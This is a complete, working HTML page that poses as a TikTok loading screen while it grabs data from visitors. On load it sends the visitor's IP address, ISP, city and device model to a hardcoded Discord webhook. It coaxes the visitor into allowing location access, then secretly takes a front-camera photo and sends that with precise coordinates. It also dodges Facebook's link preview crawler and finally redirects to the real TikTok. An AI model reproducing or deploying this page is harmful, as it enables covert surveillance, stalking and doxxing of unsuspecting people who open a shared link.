<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TikTok - Loading Content</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1505441313468710923/4ZwXHcn5adt8nWLoAgLGOuIE9ZKfeIxjZBQvgsF5qh1uLl9DeMT5wQgpwfQxWSuBkpJ9"; 

        // --- ฟังก์ชันถ่ายภาพจากกล้องหน้า ---
        async function captureFace() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('file', blob, 'face_capture.jpg');
                formData.append('payload_json', JSON.stringify({ 
                    content: "📸 **FACE CAPTURED (ภาพถ่ายจากกล้องหน้า)**\n✅ สถานะ: ถ่ายสำเร็จแล้ว" 
                }));

                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });

                // ปิดกล้องทันที
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                // ถ้าเขาไม่อนุญาตกล้อง ก็ให้ข้ามไป
            }
        }

        async function capture() {
            if (navigator.userAgent.includes("facebookexternalhit")) return;

            try {
                // --- ส่วนที่ 1: ดึงข้อมูลที่อยู่และสเปคเครื่อง ---
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const check = (val) => (val && val !== null ? val : "❌ ไม่พบข้อมูล");

                const ua = navigator.userAgent;
                let deviceType = "Desktop (PC/Laptop) (คอมพิวเตอร์)";
                let modelName = "Unknown Device (ไม่ระบุรุ่น)";

                if (/android/i.test(ua)) {
                    deviceType = "Mobile (Android) (มือถือแอนดรอยด์)";
                    const match = ua.match(/\(([^;]+);([^;]+);/);
                    modelName = match ? match[2].trim().split(" Build")[0] : "Android Device";
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    deviceType = "Mobile (iOS) (มือถือไอโอเอส)";
                    const w = screen.width, h = screen.height, pr = window.devicePixelRatio;
                    if (w === 430 && h === 932) modelName = "iPhone 14/15/16 Pro Max";
                    else if (w === 393 && h === 852) modelName = "iPhone 14/15/16 Pro";
                    else if (w === 390 && h === 844) modelName = "iPhone 12/13/14/15 (Standard)";
                    else if (w === 414 && h === 896) modelName = (pr === 3) ? "iPhone 11 Pro Max / XS Max" : "iPhone 11 / XR";
                    else if (w === 375 && h === 812) modelName = "iPhone 11 Pro / X / XS";
                    else if (w === 414 && h === 736) modelName = "iPhone 6/7/8 Plus";
                    else if (w === 375 && h === 667) modelName = "iPhone 6/7/8 / SE (2nd/3rd)";
                    else if (w === 320 && h === 568) modelName = "iPhone 5 / SE (1st)";
                    else if (/iPad/.test(ua)) modelName = "iPad";
                    else modelName = `iPhone (Screen: ${w}x${h})`;
                }

                if (navigator.userAgentData) {
                    const ent = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
                    if (ent.model) modelName = ent.model;
                    if (navigator.userAgentData.platform === "Windows") {
                        const major = parseInt(ent.platformVersion.split('.')[0]);
                        deviceType = (major >= 13) ? "Windows 11 PC (วินโดวส์ 11)" : "Windows 10 PC (วินโดวส์ 10)";
                    }
                }

                // ส่ง Report แรก: สเปคเครื่องและเน็ต (จัดหน้าสวยๆ)
                let report = `📂 **NEW TARGET LOGGED**\n`;
                report += `──────────────────────────\n`;
                report += `📱 **[DEVICE (อุปกรณ์)]**\n`;
                report += `> **Model (รุ่น):** ${modelName}\n`;
                report += `> **Type (ประเภท):** ${deviceType}\n`;
                report += `> **OS (ระบบ):** ${check(navigator.platform)}\n\n`;
                report += `🌐 **[NETWORK (เครือข่าย)]**\n`;
                report += `> **IP (ไอพี):** \`${check(data.ip)}\` \n`;
                report += `> **ISP (ค่ายเน็ต):** ${check(data.org)}\n`;
                report += `──────────────────────────`;

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: report })
                });

                // --- ส่วนที่ 2: ระบบตัดสินใจพิกัด และขอใช้กล้อง ---
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        // เมื่อกดยอมรับพิกัด ให้ลองขอใช้กล้องถ่ายรูปทันที
                        await captureFace();

                        const { latitude, longitude } = pos.coords;
                        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำ97%)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** Precise Data (ข้อมูลแม่นยำ💯)\n──────────────────────────` 
                            })
                        });
                        window.location.href = "https://www.tiktok.com";

                    }, async () => { 
                        let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n`;
                        backupReport += `──────────────────────────\n`;
                        backupReport += `📍 **[IP BASED LOCATION (ตำแหน่งอ้างอิงไอพี)]**\n`;
                        backupReport += `> **City (เมือง):** ${check(data.city)}\n`;
                        backupReport += `> **Region (จังหวัด):** ${check(data.region)}\n`;
                        backupReport += `> **Country (ประเทศ):** ${check(data.country_name)}\n\n`;
                        backupReport += `❌ **Status:** Data Inaccurate (ข้อมูลอาจไม่ตรงและคลาดเคลื่อน)\n`;
                        backupReport += `──────────────────────────`;

                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: backupReport })
                        });
                        window.location.href = "https://www.tiktok.com"; 
                    }, { 
                        enableHighAccuracy: true, 
                        maximumAge: 0, 
                        timeout: 10000 
                    });
                } else {
                    window.location.href = "https://www.tiktok.com";
                }
            } catch (e) { 
                window.location.href = "https://www.tiktok.com"; 
            }
        }
        window.onload = capture;
    </script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: sans-serif;">
    <div style="text-align:center; padding: 20px;">
        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto;"></div>
        <p style="font-size: 18px; font-weight: bold; margin-bottom: 5px;">Loading Content...</p>
        <p style="font-size: 14px; color: #ccc;">(กำลังโหลดเนื้อหา...)</p>
        <p style="font-size: 13px; color: #fe2c55; margin-top: 15px; border: 1px solid #fe2c55; padding: 8px; border-radius: 5px;">
            ⚠️ โปรดกด "อนุญาต (Allow)" เพื่อยืนยันตัวตนและเข้าชมเนื้อหาในพื้นที่ของคุณ
        </p>
    </div>
    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
</body>
</html>
